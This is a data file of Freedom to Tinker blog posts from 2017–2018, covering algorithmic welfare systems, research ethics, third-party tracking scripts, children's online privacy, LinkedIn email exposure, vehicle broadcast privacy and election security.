"376","2018-01-18","2023-03-24","https://freedom-to-tinker.com/2018/01/18/automating-inequality-virginia-eubanks-book-launch-at-data-society/","What does it mean for public sector actors to implement algorithms to make public services to be more efficient? How are these systems experienced by the families and people who face the consequences? Speaking at the Data and Society Institute today is Virginia Eubanks, author of the new book Automating Inequality: How High-Tech Tools Profile, Police, and Punish the Poor. Virginia Eubanks is an Associate Professor of Political Science at the University at Albany, SUNY. Virginia is currently a founding member of the Our Data Bodies Project and a Fellow at New America. For two decades, Eubanks has worked in community technology and economic justice movements. I first met Virginia as a PHD student at the MIT Center for Civic Media, where her book Digital Dead End helped me think about the challenges of genuine empowerment through technology, and I’ve been eagerly awaiting this latest book. Today at the Data & Society Institute, Virginia was interviewed by Alondra Nelson, president of the Social Science Research Council, and Julia Angwin, an investigative journalist at ProPublica (watch the video here). We live in a new regime of data analytics, Virginia reminds us: a lot of really great work is thinking deeply about data-based discrimination and the role that data plays to challenge the inequities of our lives or make them worse. To study this transformation, Virginia grounds her work in history and in their political contexts. These systems didn’t fall from the sky or land on us with a blank slate. Virginia also starts by talking with people who are the targets of these systems: primarily poor and working class families across the color line– people who are often left out of the conversation. Over the last year, this has involved talking with over a hundred people across the US. Origins of the Digital Poorhouse How did we get from the county poorhouse of 1819 to today’s digital poorhouse? Virginia tells us about one moment in this history: the rise of this digital poorhouse. Previously, she had expected that digitization had started in the 1990s, but she realized that digital welfare records actually started in the 1960s and 1970s with the National Welfare Rights Movement. This highly successful movement, which had origins in the civil rights movement, was successful at establishing that poor Americans should enjoy the full array of constitutional rights. In the 60s and 70s, the welfare rights movement changed policies like “man-in-house” laws, “suitable home rules,” residency restrictions, and “employable mother” says Virginia. These laws expected mothers to work and barred them from public services. In the first time in history, she argues, she expanded the rights of middle class people to poor and working class people, including unmarried moms and women of color. Even as the Welfare Rights Movement became successful, the backlash against this movement coincided with a recession. Because it had become legally impossible to discriminate against people, and administrators became caught behind a rock and a hard place. They solved this problem, says Eubanks, by commissioning a massive set of digital technologies in the late 60s and early 70s. Almost immediately, we see a drop in the ability of people to access entitlements which they were due. This happened well in advance of Reagan’s “welfare queen” speech and subsequent legislation to reduce access to welfare. This effort to manage and reduce access to public services continues today, says Virginia. The state of Indiana entered into a $1.16 billion contract with IBM and ICS to automate welfare eligibility contracts. This program used computers and call-centers to manage a queue of tasks, replacing the previous case-based, family-based system focused on supporting people. This system broke relationships between case workers and people seeking access to public assistance. It’s the most straightforward disaster: a million applications were denied in the first three years, a fifty percent reduction in denials. The state broke the contract because the system went so badly, and the case is ongoing. How Computerized Public Services Put People at Risk How did people experience this system? Virginia tells us about Omega Young, who missed a chance to apply for medicaid because she was in the hospital being treated for cancer. Because she was in the hospital, this mother struggled to meet the system’s requirements. She called the help center to let them know she was hospitalized, and her food stamps and medical assistance was cut off for “failure to cooperate.” Most people lost their assistance for this reason, often because they missed an appointment or missed a signature on a hundred-page form. The day after Omega died, she won a case Next, Virginia talks about the Allegheny Family Screening tool, a model used to predict children who might be victims of abuse and neglect in the future (Virginia has written about it here, the New York Times also recently published an account). In 1999, the city of Pittsburgh commissioned a data warehouse that collects data from everything from the police department to public services. In 2012, the office released a request for proposals funded by foundations, asking people to propose ways to mine the data to support public services. The grant went to a team of researchers who use statistical regression models to predict what children are going to face neglect, using 130 indicators to predict treatment. In the Pittsburgh area, when a call comes into the hotline for child abuse and neglect, the intake workers will interview the caller and make a decision based on two factors: the risk of the allegation (is it child abuse or neglect?) and how safe they feel that child is. Once they make those two decisions, they run the allegheny valley screening tool, which offers a thermometer from 1 to 20 predicting the level of risk. Based on those factors, the intake manager makes a decision about whether to screen that family through the county’s equivalent of child protective services. Virginia shares voices from people who were targets of this system. She talks about Angel and Patrick, who she meet at a family center. They didn’t stand out initially because their experiences are so average, like many working class white people. They’ve struggled with poor health, community violence, and predatory online education. Although they’re dedicated parents, they’ve racked up a history with the state. One of them failed to meet an antibiotic payment for their daughter. Several times, they had an anonymous tipster call investigators, who investigated them and cleared them. But each of those cases was recorded. The family is now terrified that the algorithm will label them as a risk to their children: they live in fear that someone will see their daughter outside, pick her up, and say that she can’t live with her parents anymore. Some of this system’s are ones we would expect as statisticians. The data is limited, it only includes public records, and it doesn’t track whether someone received help from private services. Yet the designers of this system have carried out all of the best practices. The design of this tool was participatory, the researchers have been transparent about everything except the weights of the predictive variables, and the algorithm is publicly owned and controlled through democratic processes. Virginia closes by asking us: how do we respond to systems that were designed using good practices that nonetheless represent a dangerous risk to working people, systems that police, profile, and punish the poor? Conversation with Alondra Nelson and Julia Angwin Julia opens up by mentioning an argument that she often has with her husband, who does work on international development. Many days, he often talks about new kinds of surveillance that could improve the lives of the poor. To serve the poor well, you need to know the data that they need. For example, he used aerial photography to figure out where all the schools in Nigeria there were– which they didn’t exactly know before and which might genuienly support the poor. But at the same time, it’s surveillance. Accessing public services is incredibly different, says Virginia, and if we can lower the barrier, that’s an incredibly possible thing. Right now, anyone who wants public assistance needs to go to many, many offices and forms. Many public assistance budgets have a line called “diversion” which is money spent by the state to reduce the number of people who access what is theirs by law. While streamlining these systems can be beneficial, people sometimes need to reduce their visibility to these systems in order to survive. When public services integrate, you become hyper-visible, which creates great harm for people, says Virginia. Surveillance systems can involve people in a cycle that can criminalize them very quickly (JNM note: for things like missing an appointment or ticking the wrong box). Evidence is great, says Virginia, and it can help us find out what works. But evidence can be used to persecute. We should always be thinking about both of those things. Alondra remarks that Virginia’s book offers a powerful example of how to ask the important questions about algorithms. Wonkish people tend to look more and more closely at the algorithms, when we could also just step back and look at how these systems affect people’s lives. Julia asks about the idea of “the deserving poor,” where so much technology has been designed to try to make decisions about who is deserving and who isn’t. How can we find a way, she asks, to talk about problems that have collective harms eve when we can’t find the perfect case of injustice? Editors and storytellers often want the “perfect victim” in order to make the story relatable. How do we escape this trap? Virginia response that people often expect that the welfare system has been designed to ensure that people get the benefits they deserve under the law. In reality, we keep on re-inventing systems that try to decide whether someone’s responsible for their poverty and avoiding supporting them. Two thirds of Americans, says Virginia, will access some kind of means-tested public service in our lifetimes, but many of us fail to admit that we’ve needed these services. And since we don’t admit that we’ve accessed these systems, we never get around to organizing to ensure that we are served effectively. To create change, says Virginia, we need people to understand how these systems affect us all, organize social movements, and also to re-imagine how we expect technologies to support the poor. She hopes that the book will help people recognize that we have a shared struggle whoever we are. Julia Angwin asks about movements like the Poor People’s Campaign, the health clinics provided by the Black Panthers, and the work done by the Panthers on sickle cell anemia (see Alondra’s book Body and Soul). Alondra responds that if you’re poor, you’re stigmatized. If you’re black, you’re stigmatized. The category of “deserving poor” does not exist for those who accept the definition. Social movements often offer us meaningful examples, says Alondra, because they look to the future. To make that work, communities need cohorts of experts who support communities and movements to shape their own futures. Virginia talks about the idea of organizing communities to review, critique, and optimizing how to interact with the forms to maximize access to rights and public services within the law. Virginia mentions the Our Data Bodies project, which talks to marginalized neighborhoods about the collection, storage, and sharing of their data by government. The purpose of the movement is to help people understand what they’re facing, confirming some of their fears, and also helping them manage their “data self defense.” People have brilliant strategies for survival, self-defense, and community defense, says Virginia. The project will be sharing initial results in March."
"377","2018-02-07","2023-03-24","https://freedom-to-tinker.com/2018/02/07/how-data-science-and-open-science-are-transforming-research-ethics-edward-freeland-at-citp/","How are data science and open science movement transforming how researchers manage research ethics? And how are these changes influencing public trust in social research? I’m here at the Center for IT Policy to hear a talk by Edward P. Freeland. Edward is the associate director of the Princeton University Survey Research Center and a lecturer at the Woodrow Wilson School of Public and International Affairs. Edward has been a member of Princeton’s Institutional Review Board since 2005 and currently serves as chair. Edward starts out by telling us about about his family’s annual Christmas card. Every year, his family loses track of a few people, and he ends up having to try to track someone down. For several years, they sent the postcard to Ed’s wife’s cousin Billy to someone in Hartford CT, but it turns out that the address was not their cousin Billy but a retired neurosurgeon. To resolve this problem this year, Edward and his wife filled out more information about their family members into an app. Along the way, he learned just how much information about people is available on the internet. While technology makes it possible to keep track of family members more easily, some of that data might be more than people want to be known. How does this relate to research ethics? Edward tells us about the principles that currently shape research ethics in the United States. These principles come from the 1978 Belmont Report, which was prompted in party by the Tuskeegee Syphilis Study, a horrifying medical study that ran for forty years. In the US, universities now have to do research focused on respect for persons, beneficence, and justice. In practice, what do university ethics boards (IRBs) care about? Edward and his colleagues compiled a list of the issues that ethics boards into a single slide: When it comes to privacy, what to university ethics boards care about? Federal regulations focus on any disclosure of the human subjects’ responses outside of the research and the risk that it would expose people to. In practice, the ethics board expects researchers to adopt procedural safeguards around who can access data and how it’s protected. In the past, studies would basically conclude after the researchers publish the research. But the practice of research has been changing. Advocates of open science have worked to reduce fraud, prevent burying of unexpected results, enhance funder/taxpayer impact, strengthen, the integrity of scientific work, work through crowdsourcing or citizen science, and collaborate in new ways. Edward tells about the Open Science Collaboration, which tried in 2015 to replicate a hundred studies from across psychology, and who often failed to do so. Now others are trying to ask similar questions across other fields including cancer research. In just a few years, the Center for Open Science has supported many researchers and journals to pre-register and publish the details of their research. Other organizations are also developing similar initiatives, such as clinicaltrials.gov. Many in the open science movement suggest that researchers archive and share data, even after submitting a manuscript. Some people use a data sharing agreement to protect data used by others. Others prepare datafiles from their research for public use. But publishing data introduces privacy risks for participants in research. While US legislation HIPAA covers medical data, there aren’t authoritative norms or guidelines around sharing that data. Many people turn to anonymization as a way to protect the information of people who participate in research. But does it really work? The landscape of data re-identification is changing from year to year, but the consensus is that anonymization doesn’t tend to work. As Matt Salganik points out in his book Bit By Bit, we should assume that all data are potentially identifiable and potentially sensitive. Where might we need to be concerned about potential problems? People are sometimes recruited to join survey panels where they answer many questions over the years. Because this data is highly-dimensional, it may be very easy to re-identify people Distributed anonymous workforces like Amazon Mechanical Turk also represent a privacy risk. The ID codes aren’t anonymous: you can google people’s IDs and find people’s comments on various Amazon products Re-identification attacks, which draw together data from many sources to find someone, are becoming more common Public Confidence in Science How we treat people’s data affects public confidence in science– not only how people interpret what we learn, but also people’s likelihood to participate in research. Edward tells us that survey response rates have been dropping, even when surveys are conducted by the government. American society has always had a fringe movement of people who resisted government data collection. If those people gain access to the levers of power, they may be able to influence the government’s likelihood to collect data that could inform the public on important issues. Edward tells us that very few people expect their data to be kept private and secure, according to research by Pew. When combined with declining trust in institutions, concerns about privacy may be one reason that fewer people are responding to surveys. At the same time, many people are organizing to try to resist surveying by the US government. Some political and activist groups have been filming their interactions with survey collectors, harassing them, and claiming that researchers or the government have secret. As researchers try to uphold public trust by doing trustworthy, beneficial research, we need to be aware of the social and political forces that influence how people think about research."
"378","2018-01-12","2023-03-24","https://freedom-to-tinker.com/2018/01/12/website-operators-are-in-the-dark-about-privacy-violations-by-third-party-scripts/","by Steven Englehardt, Gunes Acar, and Arvind Narayanan. Recently we revealed that “session replay” scripts on websites record everything you do, like someone looking over your shoulder, and send it to third-party servers. This en-masse data exfiltration inevitably scoops up sensitive, personal information — in real time, as you type it. We released the data behind our findings, including a list of 8,000 sites on which we observed session-replay scripts recording user data. As one case study of these 8,000 sites, we found health conditions and prescription data being exfiltrated from walgreens.com. These are considered Protected Health Information under HIPAA. The number of affected sites is immense; contacting all of them and quantifying the severity of the privacy problems is beyond our means. We encourage you to check out our data release and hold your favorite websites accountable. Student data exfiltration on Gradescope As one example, a pair of researchers at UC San Diego read our study and then noticed that Gradescope, a website they used for grading assignments, embeds FullStory, one of the session replay scripts we analyzed. We investigated, and sure enough, we found that student names and emails, student grades, and instructor comments on students were being sent to FullStory’s servers. This is considered Student Data under FERPA (US educational privacy law). Ironically, Princeton’s own Information Security course was also affected. We notified Gradescope of our findings, and they removed FullStory from their website within a few hours. You might wonder how the companies’ privacy policies square with our finding. As best as we can tell, Gradescope’s Terms of Service actually permit this data exfiltration [1], which is a telling comment about the ineffectiveness of Terms of Service as a way of regulating privacy. FullStory’s Terms are a different matter, and include a clause stating: “Customer agrees that it will not provide any Sensitive Data to FullStory.” We argued previously that this repudiation of responsibility by session-replay scripts puts website operators in an impossible position, because preventing data leaks might require re-engineering the site substantially, negating the core value proposition of these services, which is drag-and-drop deployment. Interestingly, Gradescope’s CEO told us that they were not aware of this requirement in FullStory’s Terms, that the clause had not existed when they first signed up for FullStory, and that they (Gradescope) had not been notified when the Terms changed. [2] Web publishers kept in the dark Of the four websites we highlighted in our previous post and this one (Bonobos, Walgreens, Lenovo, and Gradescope), three have removed the third-party scripts in question (all except Lenovo). As far as we can tell, no publisher (website operator) was aware of the exfiltration of sensitive data on their own sites until our study. Further, as mentioned above, Gradescope was unaware of key provisions in FullStory’s Terms of Service. This is a pattern we’ve noticed over and over again in our six years of doing web privacy research. Worse, in many cases the publisher has no direct relationship with the offending third-party script. In Part 2 of our study we examined two third-party scripts which exploit a vulnerability in browsers’ built-in password managers to exfiltrate user identities. One web developer was unable to determine how the script was loaded and asked us for help. We pointed out that their site loaded an ad network (media-clic.com), which in turn loaded “themoneytizer.com”, which finally loaded the offending script from Audience Insights. These chains of redirects are ubiquitous on the web, and might involve half a dozen third parties. On some websites the majority of third parties have no direct relationship with the publisher. Most of the advertising and analytics industry is premised on keeping not just users but also website operators in the dark about privacy violations. Indeed, the effort required by website operators to fully audit third parties would negate much of the benefit of offloading tasks to them. The ad tech industry creates a tremendous negative externality in terms of the privacy cost to users. Can we turn the tables? The silver lining is that if we can explain to web developers what third parties are doing on their sites, and empower them to take control, that might be one of the most effective ways to improve web privacy. But any such endeavor should keep in mind that web publishers everywhere are on tight budgets and may not have much privacy expertise. To make things concrete, here’s a proposal for how to achieve this kind of impact: Create a 1-pager summarizing the bare minimum that website operators need to know about web security, privacy, and third parties, with pointers to more information. Create a tailored privacy report for each website based on data that is already publicly available through various sources including our own data releases. Build open-source tools for website operators to scan their own sites [3]. Ideally, the tool should make recommendations for privacy-protecting changes based on the known behavior of third parties. Reach out to website operators to provide information and help make changes. This step doesn’t scale, but is crucial. If you’re interested in working with us on this, we’d love to hear from you! Endnotes We are grateful to UCSD researchers Dimitar Bounov and Sorin Lerner for bringing the vulnerabilities on Gradescope.com to our attention. [1] Gradescope’s terms of use state: “By submitting Student Data to Gradescope, you consent to allow Gradescope to provide access to Student Data to its employees and to certain third party service providers which have a legitimate need to access such information in connection with their responsibilities in providing the Service.” [2] The Wayback Machine does not archive FullStory’s Terms page far enough back in time for us to independently verify Gradescope’s statement, nor does FullStory appear in ToSBack, the EFF’s terms-of-service tracker. [3] Privacyscore.org is one example of a nascent attempt at such a tool."
"379","2017-12-06","2023-03-24","https://freedom-to-tinker.com/2017/12/06/how-the-contextual-integrity-framework-helps-explain-childrens-understanding-of-privacy-and-security-online/","This post discusses a new paper that will be presented at the 2018 ACM Conference on Computer Supported Cooperative Work and Social Computing (CSCW). I wrote this paper with co-authors Shalmali Naik, Utkarsha Devkar, Marshini Chetty, Tammy Clegg, and Jessica Vitak. Watching YouTube during breakfast. Playing Animal Jam after school. Asking Google about snakes. Checking points on Class Dojo. Posting a lip-synching video on Musical.ly. These online activities are interspersed in the daily lives of today’s children. They also involve logging into an account, disclosing information, or exchanging messages with others—actions that can raise privacy and security concerns. How do elementary school-age children conceptualize privacy and security online? What strategies do they and their parents use to help address such concerns? In interviews with 18 families, we found that children ages 5-11 understand some aspects of how privacy and security apply to online activities. And while children look to their parents for support, parents feel that privacy and security are largely a concern for the future, when their children are older, have their own smartphones, and spend more time on activities like social media. (For a summary of the paper, see this Princeton HCI post.) Privacy scholar Helen Nissenbaum’s contextual integrity framework was developed to help identify what privacy concerns emerge through the use of new technology and what types of solutions can address those concerns. We found that the framework is also useful to explain what children know (and don’t know) about privacy online and what types of educational materials can enhance that knowledge. What is contextual integrity? The contextual integrity framework considers privacy from the perspective of how information flows. People expect information to flow in a certain way in a given situation. When it does not, privacy concerns may arise. For example, the norms of a parent-teacher conference dictate that a teacher can reveal information about the parent’s child to the parent, but not about other children. Four parameters influence these norms: Context: This relates to the backdrop against which a given situation occurs. A parent-teacher conference occurs within an educational context. Attributes: This refers to the types of information involved in a particular context. The parent-teacher conference involves information about a child’s academic performance and behavioral patterns, but not necessarily the child’s medical history. Actors: This concerns the parties involved in a given situation. In a parent-teacher conference, the teacher (sender) discloses information about the student (subject) to the parent (recipient). Transmission Principles: This involves constraints that affect the flow of information. For example, information shared during a parent-teacher conference is unidirectional (i.e. teachers don’t share information about their own children with parents) and confidential (i.e. social norms and legal restrictions prevent teachers from sharing such information with the entire school). How does the contextual integrity framework help us understand what children know about privacy and security online? In our interviews, we found that children largely understood how attributes and actors could affect privacy and security online. They knew that certain types of information, such as a password, deserved more protection than others. They also recognized that it was more appropriate to share information with known parties, such as parents and teachers, rather than strangers or unknown people online. But children under age 10 struggled to grasp how interacting online could violate transmission principles by, for example, enabling unintended actors to see information. Only one child recognized that someone could take information shared in a chat message and repost it elsewhere, potentially spreading it far beyond its intended audience. Children also struggled to understand how the context of a situation could inform decisions about how to appropriately share information. They largely used the heuristic of “Could I get in trouble for this?” to guide behavior. How do children and parents navigate privacy and security online? While a few children understood that restricting access to information or providing false information online could help them protect their privacy, most relied on their parents for support in navigating potentially concerning situations. Parents primarily used passive strategies to manage their children’s technology use. They maintained a general awareness of what their children were doing, primarily by telling children to use devices only when parents were around. They minimized the chances that their children would download additional apps or spend money by withholding the passwords for app stores. Most parents felt their children were too young to face privacy or security risks online. But elementary school-age children already engage in a variety of activities online, and our results show they can absorb lessons related to privacy and security. Childrens’ willingness to rely on parents suggests that parents have an opportunity to usher their children’s knowledge to the next level. And parents may have an easier time doing so before their children reach adolescence and lose interest in listening to parents. How can the contextual integrity framework inform children’s learning about privacy and security online? The contextual integrity framework can guide the development of relevant materials that parents and others can use to scaffold their children’s learning. For example, the development of a child-friendly ad blocker could help show children that other actors, such as companies and trackers, can “see” what people do online. Videos or games that explain, in an age-appropriate manner, how the Internet works, can help children understand how the Internet can challenge transmission principles such as confidentiality. Integrating privacy and security-related lessons into apps and websites that children already use can help refine their understanding of how contexts and norms shape decisions to disclose information. For example, the website for the public broadcasting channel PBS Kids instructs children to avoid using personal information, such as their last name or address, in a username. As the boundaries between offline and online life continue to fade, privacy and security knowledge remains critical for people of all ages. Theoretical frameworks like contextual integrity help us understand how to to evaluate and enhance that knowledge. For more information, read the full paper."
"380","2017-10-04","2023-03-24","https://freedom-to-tinker.com/2017/10/04/avoid-an-equifax-like-breach-help-us-understand-how-system-administrators-patch-machines/","The recent Equifax breach that leaked around 140 million Americans’ personal information was boiled down to a system patch that was never applied, even after the company was alerted to the vulnerability in March 2017. Our work studying how users manage software updates on desktops and mobile tells a story that keeping machines patched is far from simple. Often, users do not want to apply patches because they do not trust the vendors who create the patches, the patches are applied in ways that cause too much downtime, or because the user interface changes updates make, upset users’ workflow. However, if we are going to better understand and help improve the way patches are applied so that breaches like the Equifax one are easier to avoid, we need to also study how system administrators patch multiple machines. The end goal of this work is to improve the software updating experience for everyday users as well as system administrators and enhance cybersecurity overall—after all what’s a patch really worth if it’s never installed. You can help us to achieve this goal by forwarding our survey for system administrators who manage software updates to people you know in the United States who are over 18 years of age. If you are a system administrator who manages updates for your organization, we’d greatly appreciate you taking 10-15 minutes to complete this survey. System administrators who manage updates can also participate by signing up for an hour remote interview. As a token of our appreciation, we are raffling off a Samsung Galaxy S8 to participants who complete the survey. Each interviewees will also be given a $20 Amazon gift card. To learn more about our work, visit our project page, and please reach out to us at any time if you have any questions."
"381","2017-07-20","2023-03-24","https://freedom-to-tinker.com/2017/07/20/linkedin-reveals-your-personal-email-to-your-connections/","[Huge thanks to Dillon Reisman, Arvind Narayanan, and Joanna Huey for providing great feedback on early drafts.] LinkedIn makes the primary email address associated with an account visible to all direct connections, as well as to people who have your email address in their contacts lists. By default, the primary email address is the one that was used to sign up for LinkedIn. While the primary address may be changed to another email in your account settings, there is no way to prevent your contacts from visiting your profile and viewing there whatever email you chose to be primary. In addition, the current data archive export feature of LinkedIn allows users to download their connections’ email addresses in bulk. It seems that the archive export includes all emails associated with an account, not just the one designated as primary. It appears that many of these addresses are personal, rather than professional. This post uses the contextual integrity (CI) privacy framework to consider whether the access given by LinkedIn violates the privacy norms of using a professional online social network. At the moment, LinkedIn users can see their contacts’ email addresses by clicking “Show more” on in the “Contact and Personal Info” section at the upper right of those contacts’ profiles. In addition, users can request an archive of data in their LinkedIn settings. The LinkedIn help page informs: Within minutes, you’ll receive an email with a link where you can download certain categories of personal information we have for you, including your messages, connections, and contacts. This is information that’s fastest to compile. Within 24 hours, we’ll send you a second email with a link where you can download your full archive, including your activity and account history. The file for your contacts includes their email addresses. A quick look at my personal contacts revealed that over half of them use presumably personal email accounts, such as those from Gmail, Yahoo, and Hotmail. The contacts.csv file, which is included in the exported data, reveals the emails your contacts use to log on to LinkedIn. Privacy in Context Do my connections expect their personal emails to be revealed? This, in my opinion, is an ideal case to examine through the lens of Helen Nissenbaum’s contextual integrity (CI) theory. Nissenbaum’s theory recognizes that information privacy depends on the context in which the information flows. The informational flow is valid if it conforms to the existing norms within a given context. Contextual norms may be explicitly expressed in rules or laws or implicitly embodied in convention, practice, or merely conceptions of “normal” behavior. A common thesis in most accounts is that spheres are characterized by distinctive internal structures, ontologies, teleologies, and norms. — Helen Nissenbaum, Respect for context as a Benchmark for privacy online: what it is and isn’t. The CI framework provides a way to express an existing contextual norm using a 5-parameter tuple: (sender, attribute, subject, recipient, transmission principle). Sender indicates from where the information flow originates. Attribute describes what information is being conveyed. Subject captures who or what the information is about. Recipient is where the conveyed information ends up. Transmission principle (TP) is a constraint imposed on the information flow. A contextual informational norm is breached when changes occur in any of the parameters. For example, in a medical context, you (sender and subject), as a patient, might expect to share information on a medical condition (attribute) with your doctor (recipient) in a secure manner (TP). So when your medical information ends up with your colleague instead (i.e., changing the recipient parameter), the contextual norm is breached and your privacy expectation is potentially violated. Privacy Expectations and LinkedIn Let’s examine the feature of exposing personal emails of LinkedIn connections through the CI lens and see how it might be problematic. LinkedIn is a social network that “connects the world’s professionals,” and many members have over 500 connections. However, many connections are not deep or even based in any real-world relationship: people add contacts quite easily without much vetting. I personally view LinkedIn as a professional network and prefer to separate business and personal communication. So when I use LinkedIn to reflect my professional affiliations and when I communicate through the platform, I expect to do it on a professional level. I don’t expect personal information such as my personal email to be revealed to a contact without my explicit consent. Through the CI theory, my norm can be captured as: LinkedIn (sender) —> my (subject) personal email (attribute) —> contact (recipient), only with my explicit consent (transmission principle) A change to any of the CI parameters potentially leads to a violation of privacy. So for me, my privacy expectations are violated by the change in transmission principle, as LinkedIn provides my personal email to a contact without my explicit consent. I presume other LinkedIn users might feel the same. Over half of my contacts use their personal emails: out of 571 entries (some users have multiple emails, indicating that more than primary emails are provided), 269 used Gmail, 21 used Yahoo and 16 used Hotmail, and more used a variety of other personal email providers. I suspect many of them do not realize that these emails are being revealed to their contacts and that some of that group share my privacy norm. When it comes to revealing personal emails, this is not the first time LinkedIn has been accused of violating users’ privacy expectations. In the previous version of its InMail service, you had to actively opt-out from revealing your email address. Now that the company has moved away from email-like communication towards messaging, this “feature” was removed. In another reported incident, it was possible to find out contacts’ email addresses by exploiting the syncing contacts feature because “LinkedIn assume[d] that if an email address is in your contacts list, that you must already know this person.” These examples demonstrate how a company’s assumptions and business goals can drive design decisions that lead to implementations in violation of users’ privacy expectations. While these decisions are not easy to get right (see Facebook’s public listing search and Google Buzz), the violations suggest the lack of a robust privacy framework guiding the design."
"382","2017-06-21","2023-03-24","https://freedom-to-tinker.com/2017/06/21/killing-car-privacy-by-federal-mandate/","The US National Highway Traffic Safety Administration (NHTSA) is proposing a requirement that every car should broadcast a cleartext message specifying its exact position, speed, and heading ten times per second. In comments filed in April, during the 90-day comment period, we (specifically, Leo Reyzin, Anna Lysyanskaya, Vitaly Shmatikov, Adam Smith, together with the CDT via Joseph Lorenzo Hall and Joseph Jerome) argued that this requirement will result in a significant loss to privacy. Others have aptly argued that the proposed system also has serious security challenges and cannot prevent potentially deadly malicious broadcasts, and that it will be outdated before it is deployed. In this post I focus on privacy, though I think security problems and resulting safety risks are also important to consider. The basic summary of the proposal, known as Dedicated Short Range Communication (DSRC), is as follows. From the moment a car turns on and every tenth of a second until it shuts off, it will broadcast a so-called “basic safety message” (BSM) to within a minimum distance of 300m. The message will include position (with accuracy of 1.5m), speed, heading, acceleration, yaw rate, path history for the past 300m, predicted path curvature, steering wheel angle, car length and width rounded to 20cm precision, and a few other indicators. Each message will also include a temporary vehicle id (randomly generated and changed every five minutes), to enable receivers to tell whether they are hearing from the same car or from different cars. Under the proposal, each message will be digitally signed. Each car will be provisioned with 20 certificates (and corresponding secret keys) per week, and will cycle through these certificates during the week, using each one for five minutes at a time. Certificates will be revocable; revocation is meant to guard against incorrect (malicious or erroneous) information in the broadcast messages, though there is no concrete proposal for how to detect such incorrect information. It is not hard to see that if such a system were to be deployed, a powerful antenna could easily listen to messages from well over the 300m design radius (we’ve seen examples of design range being extended by two or three orders of magnitude through the use of good antennas with bluetooth and wifi). Combining data from several antennas, one could easily link messages together, figuring out where each car was parked, what path it took, and where it ended up. This information will often enable one to link the car to an individual–for example, by looking at the address where the car is parked at night. The fundamental privacy problem with the proposal is that messages can be linked together even though they have no long-term ids. The linking is simplest, of course, when the temporary id does not change, which makes it easy to track a car for five minutes. When the temporary id changes, two consecutive messages can be easily linked using the high-precision position information they contain. One also doesn’t have to observe the exact moment that the temporary id changes: it is possible to link messages by a variety of so-called “quasi-identifiers,” such as car dimensions; position in relation to other cars; the relationship between acceleration, steering wheel angle, and yaw, which will differ for different models; variability in how different models calculate path history; repeated certificates; etc. You can read more about various linking methods in our comments; and in comments by the EFF. Thus, by using an antenna and a laptop, one could put a neighborhood under ubiquitous real-time surveillance — a boon to stalkers and burglars. Well-resourced companies, crime bosses, and government agencies could easily surveill movements of a large population in real time for pennies per car per year. To our surprise, the NHTSA proposal did not consider the cost of lost privacy in its cost-benefit analysis; instead, it considered only “perceived” privacy loss as a cost. The adjective “perceived” in this context is a convenient way to dismiss privacy concerns as figments of imagination, despite the fact that NHTSA-commissioned analysis found that BSM-based tracking would be quite easy. What about the safety benefits of proposed technology? Are they worth the privacy loss? As the EFF and Brad Templeton (among others) have argued, the proposed mandate will take away money from other safety technologies that are likely to have broader applications and raise fewer privacy concerns. The proposed technology is already becoming outdated, and will be even more out of date by the time it is deployed widely enough to make any difference. But, you may object, isn’t vehicle privacy already dead? What about license plate scanners, cell-phone-based tracking, or aerial tracking from drones? Indeed, all of these technologies are a threat to vehicle privacy. None of them, however, permits tracking quite as cheaply, undetectably, and pervasively. For example, license-plate scanners require visual contact and are more conspicuous that a hidden radio antenna would be. A report commissioned by NHTSA concluded that other approaches did not seem practical for aggregate tracking. Moreover, it is important to avoid the fallacy of relative privation: even if there are other ways of tracking cars today, we should not add one more, which will be mandated by the government for decades to come. To fix existing privacy problems, we can work on technical approaches for making cell phones harder to track or on regulatory restrictions on the use of license plate scanners. Instead of creating new privacy problems that will persist for decades, we should be working on reducing the ones that exist."
"383","2017-06-19","2023-03-24","https://freedom-to-tinker.com/2017/06/19/lessons-of-2016-for-u-s-election-security/","The 2016 election was one of the most eventful in U.S. history. We will be debating its consequences for a long time. For those of us who pay attention to the security and reliability of elections, the 2016 election teaches some important lessons. I’ll review some of them in this post. First, though, let’s review what has not changed. The level of election security varies considerably from place to place in the United States, depending on management, procedures, and of course technology choices. Places that rely on paperless voting systems, such as touchscreen voting machines that record votes directly in computer memories (so-called DREs), are at higher risk, because of the malleability of computer memory and the lack of an auditable record of the vote that was seen directly by the voter. Much better are systems such as precinct-count optical scan, in which the voter marks a paper ballot and feeds the ballot through an electronic scanner, and the ballot is collected in a ballot box as a record of the vote. The advantage of such a system is that a post-election audit that compares a random sample of paper ballots to the corresponding electronic records can verify with high confidence that the election results are consistent with what voters saw. Of course, you have to make the audit a routine post-election procedure. Now, on to the lessons of 2016. The first lesson is that nation-state adversaries may be more aggressive than we had thought. Russia took aggressive action in advance of the 2016 U.S. election, and showed signs of preparing for an attack that would disrupt or steal the election. Fortunately they did not carry out such an attack–although they did take other actions to influence the election. In the future, we will have to assume the presence of aggressive, highly capable nation-state adversaries, which we knew to be possible in principle before, but now seem more likely. The second lesson is that we should be paying more attention to attacks that aim to undermine the legitimacy of an election rather than changing the election’s result. Election-stealing attacks have gotten most of the attention up to now–and we are still vulnerable to them in some places–but it appears that external threat actors may be more interested in attacking legitimacy. Attacks on legitimacy could take several forms. An attacker could disrupt the operation of the election, for example, by corrupting voter registration databases so there is uncertainty about whether the correct people were allowed to vote. They could interfere with post-election tallying processes, so that incorrect results were reported–an attack that might have the intended effect even if the results were eventually corrected. Or the attacker might fabricate evidence of an attack, and release the false evidence after the election. Legitimacy attacks could be easier to carry out than election-stealing attacks, as well. For one thing, a legitimacy attacker will typically want the attack to be discovered, although they might want to avoid having the culprit identified. By contrast, an election-stealing attack must avoid detection in order to succeed. (If detected, it might function as a legitimacy attack.) The good news is that steps like adopting auditable paper ballots and conducting routine post-election audits are useful against both election-stealing and legitimacy attacks. If we have strong evidence of voter intent, this will make election-stealing harder, and it will make falsified evidence of election-stealing less plausible. But attacks that aim to disrupt the election process may require different types of defenses. One thing is certain: election workers have a very difficult job, and they need all of the help they can get, from the best technology to the best procedures, if we are going to reach the level of security we need."
